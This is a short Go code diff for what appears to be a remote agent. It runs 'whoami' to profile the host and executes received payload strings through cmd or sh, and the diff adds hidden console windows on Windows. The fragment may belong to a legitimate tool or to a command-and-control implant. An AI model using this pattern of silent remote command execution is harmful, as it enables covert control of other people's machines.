@@ -152,7 +152,9 @@ func collectSystemInfo() string {
 			data["id"] = strings.TrimSpace(string(out))
 		}
 	case "windows":
-		if out, err := exec.Command("whoami").Output(); err == nil {
+		cmd := exec.Command("whoami")
+		windows.HideConsole(cmd)
+		if out, err := cmd.Output(); err == nil {
 			data["user"] = strings.TrimSpace(string(out))
 		}
 	}
@@ -178,6 +180,7 @@ func executeCommand(payload interface{}) (string, error) {
 	switch runtime.GOOS {
 	case "windows":
 		cmd = exec.Command("cmd", "/C", cmdStr)
+		windows.HideConsole(cmd)
 	default:
 		cmd = exec.Command("/bin/sh", "-c", cmdStr)
 	}
